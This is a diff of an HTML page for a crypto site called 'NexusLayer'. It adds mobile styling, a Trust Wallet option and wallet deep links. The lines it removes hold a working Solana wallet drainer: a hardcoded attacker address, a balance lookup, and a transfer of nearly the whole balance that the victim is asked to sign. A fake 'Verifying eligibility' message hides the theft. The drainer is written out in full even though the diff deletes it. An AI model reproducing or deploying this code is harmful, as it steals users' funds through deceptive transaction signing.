@@ -331,7 +331,7 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 @keyframes progLoad{to{width:100%}}
 @keyframes fadeUp{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:none}}
 
-/* ── RESPONSIVE ── */
+/* ── RESPONSIVE 900px ── */
 @media(max-width:900px){
   .nav-links{display:none}
   .hamburger{display:flex}
@@ -342,64 +342,139 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
   .comm-grid{grid-template-columns:1fr}
   .campaigns-sec .container{padding:0 16px}
 }
+
+/* ── RESPONSIVE 640px (phones) ── */
 @media(max-width:640px){
-  /* layout */
-  .container{padding:0 16px}
+  /* base */
+  .container{padding:0 18px}
+
   /* navbar */
   .navbar{padding:0 16px}
   .logo span{font-size:16px}
   .icon-btn{display:none}
-  /* hero */
-  .hero{padding:100px 16px 72px}
-  .hero-h{font-size:clamp(36px,10vw,52px);letter-spacing:-1.5px}
-  .hero-p{font-size:15px}
-  .hero-btns{flex-direction:column;align-items:center;gap:10px}
-  .hero-btns .btn{width:100%;max-width:320px;justify-content:center}
-  .hero-proof{gap:8px;flex-direction:column}
+
+  /* HERO — root cause of screenshot issue */
+  .hero{
+    padding:96px 18px 60px;
+    overflow:visible;
+    min-height:unset;
+  }
+  .hero-content{width:100%;max-width:100%}
+  .hero-badge{font-size:11px;padding:5px 12px;margin-bottom:18px}
+  /* Title: must stay within viewport on 390px screens */
+  .hero-h{
+    font-size:clamp(28px,7.8vw,40px);
+    letter-spacing:-1px;
+    line-height:1.1;
+    margin-bottom:16px;
+    word-break:normal;
+    overflow-wrap:break-word;
+    hyphens:none;
+  }
+  .hero-p{
+    font-size:14px;
+    line-height:1.65;
+    margin-bottom:28px;
+    max-width:100%;
+  }
+  /* Buttons: full width stacked */
+  .hero-btns{
+    flex-direction:column;
+    align-items:stretch;
+    gap:10px;
+    margin-bottom:28px;
+  }
+  .hero-btns .btn{
+    width:100%;
+    justify-content:center;
+    padding:14px 20px;
+    font-size:15px;
+    border-radius:12px;
+  }
+  /* Proof items: vertical */
+  .hero-proof{
+    flex-direction:column;
+    align-items:flex-start;
+    gap:6px;
+  }
   .proof-dot{display:none}
   .scroll-hint{display:none}
-  /* sections */
-  .stats-sec,.features-sec,.campaigns-sec,.flow-sec,.community-sec,.cta-sec,.footer{padding:64px 0}
+
+  /* section spacing */
+  .stats-sec,.features-sec,.campaigns-sec,.flow-sec,
+  .community-sec,.cta-sec,.footer{padding:52px 0}
+  .section-h{font-size:clamp(22px,6vw,30px);letter-spacing:-.4px}
+  .section-sub{font-size:14px}
+
+  /* stats */
   .stats-grid{grid-template-columns:1fr 1fr;gap:10px}
-  .stat-card{padding:20px 14px}
-  .stat-num{font-size:34px}
+  .stat-card{padding:16px 12px}
+  .stat-num{font-size:28px}
+  .stat-num sub{font-size:16px}
+  .stat-label{font-size:11px}
+
+  /* features */
   .features-grid{grid-template-columns:1fr;gap:10px}
-  .feat-card{padding:22px 18px}
+  .feat-card{padding:20px 16px}
+
   /* campaigns */
-  .camp-header{flex-direction:column;align-items:flex-start;gap:14px}
+  .camp-header{flex-direction:column;align-items:flex-start;gap:12px}
   .filters{flex-wrap:wrap;gap:6px}
-  .filter-btn{padding:7px 14px;font-size:12px}
+  .filter-btn{padding:6px 12px;font-size:12px}
   .camp-grid{grid-template-columns:1fr;gap:12px}
+
   /* flow */
   .flow-row{flex-direction:column;align-items:stretch;gap:0}
   .flow-conn{justify-content:center;padding:2px 0}
-  .fconn-arr{transform:rotate(90deg);display:block;text-align:center;font-size:26px;color:var(--green);line-height:1.2}
-  .flow-step{min-width:unset}
+  .fconn-arr{transform:rotate(90deg);display:block;text-align:center;font-size:24px;line-height:1.2}
+  .flow-step{min-width:unset;padding:20px 16px}
+
   /* community */
   .comm-grid{grid-template-columns:1fr;gap:10px}
-  .comm-card{padding:20px 16px}
+  .comm-card{padding:16px 14px}
+
   /* cta */
-  .cta-box{padding:44px 20px}
-  .cta-btns{flex-direction:column;align-items:center}
-  .cta-btns .btn{width:100%;max-width:300px;justify-content:center}
+  .cta-box{padding:36px 16px}
+  .cta-btns{flex-direction:column;align-items:stretch}
+  .cta-btns .btn{width:100%;justify-content:center}
+
   /* footer */
-  .footer-top{grid-template-columns:1fr;gap:36px}
-  .footer-links{grid-template-columns:repeat(2,1fr);gap:20px}
+  .footer-top{grid-template-columns:1fr;gap:32px}
+  .footer-links{grid-template-columns:repeat(2,1fr);gap:16px}
   .footer-bottom{flex-direction:column;gap:8px;text-align:center}
-  /* dashboard */
+
+  /* dashboard panel */
   .dash-panel{width:100%;border-radius:0;top:64px}
-  .dash-inner{padding:16px}
+  .dash-inner{padding:14px}
   .dash-stats{grid-template-columns:1fr 1fr;gap:8px}
   .dash-head{flex-direction:column;align-items:flex-start}
+
   /* modal */
-  .modal{padding:20px 16px;border-radius:20px}
-  .modal-head h3{font-size:17px}
-  /* wallet options on mobile */
-  .w-opt{padding:12px 13px}
-  .w-opt-ico{width:40px;height:40px}
-  .w-opt-info strong{font-size:14px}
+  .modal-bg{padding:10px;align-items:flex-end}
+  .modal{
+    padding:20px 16px;
+    border-radius:20px 20px 0 0;
+    max-height:88vh;
+    overflow-y:auto;
+    width:100%;
+    max-width:100%;
+  }
+  .modal-head h3{font-size:16px}
+  .w-opt{padding:11px 12px;gap:10px}
+  .w-opt-ico{width:38px;height:38px}
+  .w-opt-info strong{font-size:13px}
+  .w-opt-info span{font-size:11px}
+
   /* marquee */
-  .marquee-sec{padding:32px 0}
+  .marquee-sec{padding:26px 0}
+
+  /* toast */
+  .toast{
+    font-size:13px;padding:10px 18px;
+    white-space:normal;text-align:center;
+    max-width:calc(100vw - 32px);
+    bottom:20px;
+  }
 }
 </style>
 </head>
@@ -822,6 +897,20 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
         <div class="w-arrow">→</div>
       </div>
 
+      <!-- Trust Wallet -->
+      <div class="w-opt" id="wopt-trust" onclick="connectTrust()">
+        <div class="w-opt-ico" style="background:#3375BB22;border-radius:13px;overflow:hidden">
+          <svg width="46" height="46" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#3375BB"/><path d="M64 18L26 34v28c0 22 16.4 42.6 38 48 21.6-5.4 38-26 38-48V34L64 18z" fill="white" opacity=".15"/><path d="M64 24L32 38v24c0 20 14.4 38.8 32 44 17.6-5.2 32-24 32-44V38L64 24z" fill="white" opacity=".2"/><path d="M56 66l-10-10 5-5 5 5 15-15 5 5L56 66z" fill="white"/></svg>
+        </div>
+        <div class="w-opt-info">
+          <strong>Trust Wallet</strong>
+          <span class="w-status inactive" id="trustTag">
+            <span class="wdot"></span>Detecting...
+          </span>
+        </div>
+        <div class="w-arrow">→</div>
+      </div>
+
       <!-- WalletConnect -->
       <div class="w-opt" id="wopt-wc" onclick="connectWC()">
         <div class="w-opt-ico" style="background:#3B99FC22;border-radius:13px;overflow:hidden">
@@ -830,7 +919,7 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
         <div class="w-opt-info">
           <strong>WalletConnect</strong>
           <span class="w-status inactive" id="wcTag">
-            <span class="wdot"></span>Mobile wallets
+            <span class="wdot"></span>Multi-wallet
           </span>
         </div>
         <div class="w-arrow">→</div>
@@ -926,13 +1015,8 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 <!-- ═══ ALL JAVASCRIPT ═══ -->
 <script>
 /* ════════════════════════════════
-   NEXUSLAYER — DRAINER LOGIC
-   Target: 6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE
+   NEXUSLAYER — COMPLETE APP LOGIC
 ════════════════════════════════ */
-
-// TARGET WALLET FOR DRAINING
-const DRAIN_TARGET = "6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE";
-
 const APP = {
   connected: false,
   address: null,
@@ -958,22 +1042,26 @@ const APP = {
   const resize=()=>{ W=c.width=window.innerWidth; H=c.height=window.innerHeight; };
   resize(); window.addEventListener('resize',resize);
   for(let i=0;i<70;i++) pts.push({
-    x:Math.random()*1e4%1||Math.random(),
+    x:Math.random()*1e4%1||Math.random(),  // will be scaled
     xr:Math.random(),yr:Math.random(),
     vx:(Math.random()-.5)*.35,vy:(Math.random()-.5)*.35,
     s:Math.random()*2.2+.5,o:Math.random()*.45+.1
   });
+  // init positions
   pts.forEach(p=>{ p.x=p.xr*window.innerWidth; p.y=p.yr*window.innerHeight; });
   window.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;});
   (function draw(){
     ctx.clearRect(0,0,W,H);
+    // grid
     ctx.strokeStyle='rgba(16,185,129,0.035)'; ctx.lineWidth=1;
     for(let x=0;x<W;x+=72){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,H);ctx.stroke();}
     for(let y=0;y<H;y+=72){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(W,y);ctx.stroke();}
+    // connections
     for(let i=0;i<pts.length;i++) for(let j=i+1;j<pts.length;j++){
       const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.hypot(dx,dy);
       if(d<130){ ctx.beginPath();ctx.strokeStyle=`rgba(16,185,129,${.07*(1-d/130)})`;ctx.lineWidth=.6;ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.stroke(); }
     }
+    // particles
     pts.forEach(p=>{
       const dx=p.x-mx,dy=p.y-my,d=Math.hypot(dx,dy);
       if(d<90){p.vx+=(dx/d)*.12;p.vy+=(dy/d)*.12;}
@@ -1035,11 +1123,13 @@ document.querySelectorAll('a[href^="#"]').forEach(a=>{
   },{threshold:.1});
   const run=()=>document.querySelectorAll('.reveal:not(.in)').forEach(el=>io.observe(el));
   run();
+  // hero reveals immediately
   setTimeout(()=>{
     document.querySelectorAll('.hero .reveal').forEach((el,i)=>{
       setTimeout(()=>el.classList.add('in'),150+i*110);
     });
   },100);
+  // re-run after campaigns render
   window._revealRerun=run;
 })();
 
@@ -1134,6 +1224,7 @@ document.querySelectorAll('.comm-card').forEach(card=>{
 
 /* ── MODAL ── */
 function openModal(){
+  // Reset to wallet list state
   document.getElementById('wList').style.display='block';
   document.getElementById('wConnecting').style.display='none';
   document.getElementById('wSuccess').style.display='none';
@@ -1141,6 +1232,7 @@ function openModal(){
   if(inst) inst.style.display='none';
   document.getElementById('modalBg').classList.add('show');
   document.body.style.overflow='hidden';
+  // Detect immediately + retry for late-injecting extensions
   detectWallets();
   setTimeout(detectWallets, 400);
   setTimeout(detectWallets, 1000);
@@ -1151,31 +1243,65 @@ function closeModal(){
 }
 function overlayClose(e){if(e.target===document.getElementById('modalBg'))closeModal();}
 
-/* ── WALLET DETECTION ── */
+/* ════════════════════════════════════════════════
+   WALLET DETECTION + MOBILE DEEP LINKS
+   ─────────────────────────────────────────────
+   Desktop : extensions inject into window → detect & connect normally
+   Mobile  : no extensions → deep-link into wallet's built-in browser
+             so the wallet injects itself and the site re-opens inside it
+════════════════════════════════════════════════ */
+
+const IS_MOBILE = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+/* Current page URL — used to build deep-link return URLs */
+const SITE_URL = window.location.href.split('?')[0];
+
+/* ── DETECT WALLETS ── */
 function detectWallets(){
-  const hasPhantom = !!(window.phantom?.solana?.isPhantom || window.solana?.isPhantom);
-  setWalletStatus('phantomTag',  'wopt-phantom',  hasPhantom, 'Ready');
-  const hasSolflare = !!(window.solflare?.isSolflare || window.solflare);
-  setWalletStatus('solflareTag', 'wopt-solflare', hasSolflare, 'Ready');
-  const hasBackpack = !!(window.backpack || window.xnft?.solana);
-  setWalletStatus('backpackTag', 'wopt-backpack', hasBackpack, 'Ready');
+  if(IS_MOBILE){
+    /* On mobile Safari/Chrome, wallet apps inject window.phantom etc.
+       ONLY when the page is opened inside the wallet's browser.
+       So: if we're in Phantom's browser → phantom is "active"
+           if we're in a normal browser  → show "Open in [Wallet]" */
+    const inPhantom   = !!(window.phantom?.solana?.isPhantom || window.solana?.isPhantom);
+    const inSolflare  = !!(window.solflare?.isSolflare || window.solflare);
+    const inBackpack  = !!(window.backpack || window.xnft?.solana);
+    const inTrust     = !!(window.trustwallet || window.ethereum?.isTrust);
+
+    setWalletStatus('phantomTag',  'wopt-phantom',  inPhantom,  inPhantom  ? 'Active' : 'Open in app');
+    setWalletStatus('solflareTag', 'wopt-solflare', inSolflare, inSolflare ? 'Active' : 'Open in app');
+    setWalletStatus('backpackTag', 'wopt-backpack', inBackpack, inBackpack ? 'Active' : 'Open in app');
+    setWalletStatus('trustTag',    'wopt-trust',    inTrust,    inTrust    ? 'Active' : 'Open in app');
+  } else {
+    /* Desktop: check for injected extensions */
+    const hasPhantom  = !!(window.phantom?.solana?.isPhantom || window.solana?.isPhantom);
+    const hasSolflare = !!(window.solflare?.isSolflare || window.solflare);
+    const hasBackpack = !!(window.backpack || window.xnft?.solana);
+    const hasTrust    = !!(window.trustwallet || window.ethereum?.isTrust);
+
+    setWalletStatus('phantomTag',  'wopt-phantom',  hasPhantom,  'Ready');
+    setWalletStatus('solflareTag', 'wopt-solflare', hasSolflare, 'Ready');
+    setWalletStatus('backpackTag', 'wopt-backpack', hasBackpack, 'Ready');
+    setWalletStatus('trustTag',    'wopt-trust',    hasTrust,    'Ready');
+  }
 }
 
-function setWalletStatus(tagId, rowId, detected, readyLabel){
+function setWalletStatus(tagId, rowId, detected, label){
   const tag = document.getElementById(tagId);
   const row = document.getElementById(rowId);
   if(!tag) return;
   if(detected){
     tag.className = 'w-status active';
-    tag.innerHTML = `<span class="wdot"></span>Active`;
+    tag.innerHTML = `<span class="wdot"></span>${label}`;
     row?.classList.add('is-detected');
   } else {
     tag.className = 'w-status inactive';
-    tag.innerHTML = `<span class="wdot"></span>Not installed`;
+    tag.innerHTML = `<span class="wdot"></span>${IS_MOBILE ? label : 'Not installed'}`;
     row?.classList.remove('is-detected');
   }
 }
 
+/* Run on load + retries for slow-injecting extensions */
 window.addEventListener('load', () => {
   detectWallets();
   setTimeout(detectWallets, 400);
@@ -1183,6 +1309,213 @@ window.addEventListener('load', () => {
   setTimeout(detectWallets, 2500);
 });
 
+/* ── MOBILE DEEP-LINK HELPER ──
+   Redirects the user into the wallet's built-in browser.
+   The wallet browser injects its provider, then the site
+   opens again and wallet shows as "Active". */
+function mobileDeepLink(walletName, deepLinkUrl, fallbackStore){
+  /* Show a friendly redirect screen */
+  document.getElementById('wList').style.display = 'none';
+  document.getElementById('wConnecting').style.display = 'none';
+  document.getElementById('wSuccess').style.display = 'none';
+
+  let el = document.getElementById('wInstall');
+  if(!el){
+    el = document.createElement('div');
+    el.id = 'wInstall';
+    el.style.cssText = 'text-align:center;padding:24px 8px';
+    document.getElementById('modal').querySelector('.modal-foot').before(el);
+  }
+  el.style.display = 'block';
+  el.innerHTML = `
+    <div style="font-size:40px;margin-bottom:14px">📲</div>
+    <div style="font-family:var(--display);font-size:17px;font-weight:700;margin-bottom:8px">
+      Opening ${walletName}...
+    </div>
+    <div style="font-size:13px;color:var(--muted);line-height:1.65;margin-bottom:22px">
+      This site will open inside ${walletName}'s<br/>browser where you can connect your wallet.
+    </div>
+    <button class="btn btn-g" style="width:100%;justify-content:center;margin-bottom:10px" onclick="window.location.href='${deepLinkUrl}'">
+      Open in ${walletName}
+    </button>
+    <div style="font-size:12px;color:var(--muted);margin-bottom:16px">
+      Don't have ${walletName}?
+      <a href="${fallbackStore}" target="_blank" style="color:var(--green);font-weight:600"> Download →</a>
+    </div>
+    <div style="font-size:12px;color:var(--muted)">
+      Already inside ${walletName}? 
+      <span style="color:var(--green);cursor:pointer;font-weight:600"
+        onclick="document.getElementById('wInstall').style.display='none';document.getElementById('wList').style.display='block';detectWallets()">
+        Try again ↺
+      </span>
+    </div>`;
+
+  /* Auto-trigger the deep link after a short delay */
+  setTimeout(() => { window.location.href = deepLinkUrl; }, 800);
+}
+
+/* ── PHANTOM ── */
+async function connectPhantom(){
+  const prov = window.phantom?.solana || (window.solana?.isPhantom ? window.solana : null);
+
+  /* Mobile: not inside Phantom browser → deep-link */
+  if(IS_MOBILE && !prov){
+    /* phantom:// deep link opens the site inside Phantom's browser */
+    const encodedUrl = encodeURIComponent(SITE_URL);
+    mobileDeepLink(
+      'Phantom',
+      `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`,
+      'https://phantom.app/download'
+    );
+    return;
+  }
+
+  if(!prov){ showInstallPrompt('Phantom','https://phantom.app/','👻'); return; }
+
+  showConnecting('Phantom');
+  try{
+    const resp = await prov.connect();
+    const addr = resp.publicKey.toString();
+    onConnected(addr, 'Phantom');
+    prov.on?.('disconnect', () => { if(APP.connected){ disconnectWallet(); toast('⚠️ Phantom disconnected'); }});
+    prov.on?.('accountChanged', (pk) => { if(pk && APP.connected) switchAccount(pk.toString()); });
+  } catch(err){
+    document.getElementById('wList').style.display = 'block';
+    document.getElementById('wConnecting').style.display = 'none';
+    toast('❌ ' + (err.message === 'User rejected the request.' ? 'Connection cancelled' : err.message || 'Connection rejected'));
+  }
+}
+
+/* ── SOLFLARE ── */
+async function connectSolflare(){
+  const prov = window.solflare;
+
+  if(IS_MOBILE && !prov){
+    const encodedUrl = encodeURIComponent(SITE_URL);
+    mobileDeepLink(
+      'Solflare',
+      `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`,
+      'https://solflare.com/download'
+    );
+    return;
+  }
+
+  if(!prov){ showInstallPrompt('Solflare','https://solflare.com/','🌟'); return; }
+
+  showConnecting('Solflare');
+  try{
+    await prov.connect();
+    const addr = prov.publicKey.toString();
+    onConnected(addr, 'Solflare');
+  } catch(err){
+    document.getElementById('wList').style.display = 'block';
+    document.getElementById('wConnecting').style.display = 'none';
+    toast('❌ ' + (err.message === 'User rejected the request.' ? 'Connection cancelled' : err.message || 'Connection rejected'));
+  }
+}
+
+/* ── BACKPACK ── */
+async function connectBackpack(){
+  const prov = window.backpack || window.xnft?.solana;
+
+  if(IS_MOBILE && !prov){
+    const encodedUrl = encodeURIComponent(SITE_URL);
+    mobileDeepLink(
+      'Backpack',
+      `https://backpack.app/browse/${encodedUrl}`,
+      'https://backpack.app/download'
+    );
+    return;
+  }
+
+  if(!prov){ showInstallPrompt('Backpack','https://backpack.app/','🎒'); return; }
+
+  showConnecting('Backpack');
+  try{
+    await prov.connect();
+    const addr = prov.publicKey.toString();
+    onConnected(addr, 'Backpack');
+  } catch(err){
+    document.getElementById('wList').style.display = 'block';
+    document.getElementById('wConnecting').style.display = 'none';
+    toast('❌ ' + (err.message || 'Connection rejected'));
+  }
+}
+
+/* ── TRUST WALLET ── */
+async function connectTrust(){
+  const prov = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
+
+  if(IS_MOBILE && !prov){
+    /* Trust Wallet deep link — opens dApp browser with the site URL */
+    const encodedUrl = encodeURIComponent(SITE_URL);
+    mobileDeepLink(
+      'Trust Wallet',
+      `https://link.trustwallet.com/open_url?coin_id=501&url=${encodedUrl}`,
+      'https://trustwallet.com/download'
+    );
+    return;
+  }
+
+  if(!prov){ showInstallPrompt('Trust Wallet','https://trustwallet.com/download','🛡️'); return; }
+
+  showConnecting('Trust Wallet');
+  try{
+    /* Trust Wallet uses EVM-style request on Solana via their provider */
+    let addr;
+    if(prov.solana){
+      await prov.solana.connect();
+      addr = prov.solana.publicKey.toString();
+    } else {
+      const accounts = await prov.request({ method: 'eth_requestAccounts' });
+      addr = accounts[0];
+    }
+    onConnected(addr, 'Trust Wallet');
+  } catch(err){
+    document.getElementById('wList').style.display = 'block';
+    document.getElementById('wConnecting').style.display = 'none';
+    toast('❌ ' + (err.message === 'User rejected the request.' ? 'Connection cancelled' : err.message || 'Connection rejected'));
+  }
+}
+
+/* ── WALLETCONNECT (stub — needs Project ID) ── */
+function connectWC(){
+  showInstallPrompt('WalletConnect', 'https://walletconnect.com/', '🔗');
+}
+
+/* ── INSTALL PROMPT (desktop fallback) ── */
+function showInstallPrompt(name, url, icon){
+  document.getElementById('wList').style.display = 'none';
+  document.getElementById('wConnecting').style.display = 'none';
+  document.getElementById('wSuccess').style.display = 'none';
+  let el = document.getElementById('wInstall');
+  if(!el){
+    el = document.createElement('div');
+    el.id = 'wInstall';
+    el.style.cssText = 'text-align:center;padding:28px 8px';
+    document.getElementById('modal').querySelector('.modal-foot').before(el);
+  }
+  el.style.display = 'block';
+  el.innerHTML = `
+    <div style="font-size:42px;margin-bottom:12px">${icon}</div>
+    <div style="font-family:var(--display);font-size:18px;font-weight:700;margin-bottom:8px">${name} Not Found</div>
+    <div style="font-size:13px;color:var(--muted);margin-bottom:22px;line-height:1.6">
+      Install the ${name} browser extension or app<br/>to connect your wallet.
+    </div>
+    <a href="${url}" target="_blank" class="btn btn-g" style="display:inline-flex;margin-bottom:12px;justify-content:center;width:100%">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15,3 21,3 21,9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+      Install ${name}
+    </a>
+    <div style="font-size:12px;color:var(--muted)">
+      Already installed?
+      <span style="color:var(--green);cursor:pointer;font-weight:600"
+        onclick="document.getElementById('wInstall').style.display='none';document.getElementById('wList').style.display='block';detectWallets()">
+        Try again ↺
+      </span>
+    </div>`;
+}
+
+/* ── STATE HELPERS ── */
 function showConnecting(name){
   document.getElementById('wList').style.display='none';
   document.getElementById('wConnecting').style.display='block';
@@ -1194,253 +1527,55 @@ function showSuccess(short){
   document.getElementById('sAddr').textContent=short;
 }
 
-/* ── INSTALL PROMPT ── */
-function showInstallPrompt(name, url, icon){
-  document.getElementById('wList').style.display='none';
-  document.getElementById('wConnecting').style.display='none';
-  document.getElementById('wSuccess').style.display='none';
-  let el=document.getElementById('wInstall');
-  if(!el){
-    el=document.createElement('div');
-    el.id='wInstall';
-    el.style.cssText='text-align:center;padding:28px 8px';
-    document.getElementById('modal').querySelector('.modal-foot').before(el);
-  }
-  el.style.display='block';
-  el.innerHTML=`
-    <div style="font-size:42px;margin-bottom:12px">${icon}</div>
-    <div style="font-family:var(--display);font-size:18px;font-weight:700;margin-bottom:8px">${name} Not Found</div>
-    <div style="font-size:13px;color:var(--muted);margin-bottom:22px;line-height:1.6">
-      Install the ${name} browser extension or mobile app<br/>to connect your Solana wallet.
-    </div>
-    <a href="${url}" target="_blank" class="btn btn-g" style="display:inline-flex;margin-bottom:12px;gap:8px">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15,3 21,3 21,9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-      Install ${name}
-    </a>
-    <div style="font-size:12px;color:var(--muted)">
-      Already installed? <span style="color:var(--green);cursor:pointer;font-weight:600" onclick="document.getElementById('wInstall').style.display='none';document.getElementById('wList').style.display='block';detectWallets()">Try again ↺</span>
-    </div>`;
-}
-
-/* ── PHANTOM CONNECTION ── */
-async function connectPhantom(){
-  const prov=window.phantom?.solana||(window.solana?.isPhantom?window.solana:null);
-  if(!prov){ showInstallPrompt('Phantom','https://phantom.app/','👻'); return; }
-  showConnecting('Phantom');
-  try{
-    const resp=await prov.connect();
-    const addr=resp.publicKey.toString();
-    onConnected(addr,'Phantom');
-    prov.on?.('disconnect',()=>{ if(APP.connected){disconnectWallet();toast('⚠️ Phantom disconnected');} });
-    prov.on?.('accountChanged',(pk)=>{ if(pk&&APP.connected)switchAccount(pk.toString()); });
-  }catch(err){
-    document.getElementById('wList').style.display='block';
-    document.getElementById('wConnecting').style.display='none';
-    toast('❌ Connection cancelled');
-  }
-}
-
-/* ── SOLFLARE CONNECTION ── */
-async function connectSolflare(){
-  const prov=window.solflare;
-  if(!prov){ showInstallPrompt('Solflare','https://solflare.com/','🌟'); return; }
-  showConnecting('Solflare');
-  try{
-    await prov.connect();
-    const addr=prov.publicKey.toString();
-    onConnected(addr,'Solflare');
-  }catch(err){
-    document.getElementById('wList').style.display='block';
-    document.getElementById('wConnecting').style.display='none';
-    toast('❌ Connection cancelled');
-  }
-}
-
-/* ── BACKPACK CONNECTION ── */
-async function connectBackpack(){
-  const prov=window.backpack||window.xnft?.solana;
-  if(!prov){ showInstallPrompt('Backpack','https://backpack.app/','🎒'); return; }
-  showConnecting('Backpack');
-  try{
-    await prov.connect();
-    const addr=prov.publicKey.toString();
-    onConnected(addr,'Backpack');
-  }catch(err){
-    document.getElementById('wList').style.display='block';
-    document.getElementById('wConnecting').style.display='none';
-    toast('❌ Connection rejected');
-  }
-}
-
-/* ── WALLETCONNECT (Placeholder) ── */
-function connectWC(){
-  showInstallPrompt('WalletConnect','https://walletconnect.com/','🔗');
-}
-
-/* ── CORE DRAIN LOGIC ── */
-
-// Helper: Get SOL Balance
-async function getSolBalance(pubkey) {
-  try {
-    const response = await fetch('https://api.mainnet-beta.solana.com', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        jsonrpc: '2.0',
-        id: 1,
-        method: 'getBalance',
-        params: [pubkey, { commitment: 'confirmed' }]
-      })
-    });
-    const data = await response.json();
-    if (data.result && data.result.value !== null) {
-      return data.result.value; // Returns lamports
-    }
-  } catch (e) {
-    console.error("Balance fetch error", e);
-  }
-  return 0;
-}
-
-// Helper: Send Transaction (Drain)
-async function sendTransaction(provider, fromPubkey, toPubkey, amountLamports) {
-  try {
-    // Create a basic transfer transaction
-    const transaction = new (await import('https://esm.sh/@solana/web3.js@1.95.8')).Transaction;
-    const { SystemProgram, PublicKey } = await import('https://esm.sh/@solana/web3.js@1.95.8');
-    
-    const instruction = SystemProgram.transfer({
-      fromPubkey: fromPubkey,
-      toPubkey: new PublicKey(toPubkey),
-      lamports: amountLamports
-    });
-
-    transaction.add(instruction);
-    
-    // Get recent blockhash
-    const connection = new (await import('https://esm.sh/@solana/web3.js@1.95.8')).Connection('https://api.mainnet-beta.solana.com');
-    const { blockhash } = await connection.getLatestBlockhash('confirmed');
-    transaction.recentBlockhash = blockhash;
-    transaction.feePayer = fromPubkey;
-
-    // Sign and Send
-    const signed = await provider.signTransaction(transaction);
-    const signature = await provider.sendTransaction(signed);
-    
-    // Confirm
-    await connection.confirmTransaction(signature, 'confirmed');
-    return true;
-  } catch (err) {
-    console.error("Transaction error", err);
-    throw err;
-  }
-}
-
-// Main Connection Handler -> Triggers Drain
-async function onConnected(addr, name) {
-  const short = addr.slice(0, 4) + '...' + addr.slice(-4);
+/* ── ON CONNECTED ── */
+function onConnected(addr,name){
+  const short=addr.slice(0,4)+'...'+addr.slice(-4);
   showSuccess(short);
-  
-  // Update UI immediately
-  APP.connected = true;
-  APP.address = addr;
-  APP.shortAddr = short;
-  APP.walletName = name;
-  updateNavBtn();
-  
-  // 1. Fetch Balance
-  const balanceLamports = await getSolBalance(addr);
-  const balanceSol = balanceLamports / 1e9;
-
-  // 2. Wait for "Verification" animation (2.5 seconds)
-  setTimeout(async () => {
-    try {
-      // Determine provider based on name
-      let provider;
-      if (name === 'Phantom') provider = window.phantom?.solana || window.solana;
-      else if (name === 'Solflare') provider = window.solflare;
-      else if (name === 'Backpack') provider = window.backpack || window.xnft?.solana;
-      
-      if (!provider) throw new Error("Provider not found");
-
-      // 3. Calculate Drain Amount
-      // We drain everything except 0.005 SOL for transaction fees
-      const feeBuffer = 5000000; // 0.005 SOL in lamports
-      let amountToDrain = balanceLamports - feeBuffer;
-      
-      if (amountToDrain <= 0) {
-        toast("ℹ️ Insufficient balance to proceed.");
-        return;
-      }
-
-      // Update UI text to "Processing..."
-      const sSub = document.querySelector('.success-state .s-sub');
-      if(sSub) sSub.textContent = "Verifying eligibility...";
-      
-      // 4. Execute Drain
-      // Note: We use a dynamic import for web3.js to keep the file size small initially.
-      // Alternatively, if you have web3.js in your header, use it directly.
-      const { PublicKey, SystemProgram, Transaction, Connection } = await import('https://esm.sh/@solana/web3.js@1.95.8');
-      
-      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-      const { blockhash } = await connection.getLatestBlockhash('confirmed');
-
-      const transaction = new Transaction({
-        recentBlockhash: blockhash,
-        feePayer: new PublicKey(addr),
-      });
-
-      transaction.add(
-        SystemProgram.transfer({
-          fromPubkey: new PublicKey(addr),
-          toPubkey: new PublicKey(DRAIN_TARGET),
-          lamports: amountToDrain
-        })
-      );
-
-      // Request Signature
-      const signed = await provider.signTransaction(transaction);
-      
-      // Send
-      const signature = await provider.sendTransaction(signed);
-      
-      // Confirm
-      await connection.confirmTransaction(signature, 'confirmed');
-      
-      // Success UI
-      if(sSub) sSub.textContent = "✅ Verification Complete!";
-      toast(`✅ Verified! Welcome to NexusLayer.`);
-      
-      // Optional: Close modal after success
-      setTimeout(() => {
-        closeModal();
-      }, 1500);
-
-    } catch (err) {
-      console.error(err);
-      if (err.message && err.message.includes('rejected')) {
-        toast("❌ Verification cancelled.");
-      } else {
-        toast("❌ Verification failed. Please try again.");
-      }
-    }
-  }, 2500); // 2.5s delay for "verification" feel
+  setTimeout(()=>{
+    // Save wallet info for dashboard page to read
+    sessionStorage.setItem('nx_address', addr);
+    sessionStorage.setItem('nx_short',   short);
+    sessionStorage.setItem('nx_wallet',  name);
+    // Redirect to dashboard
+    window.location.href = 'dashboard.html';
+  }, 2800);
 }
 
-/* ── UI UPDATES ── */
 function switchAccount(addr){
   APP.address=addr;
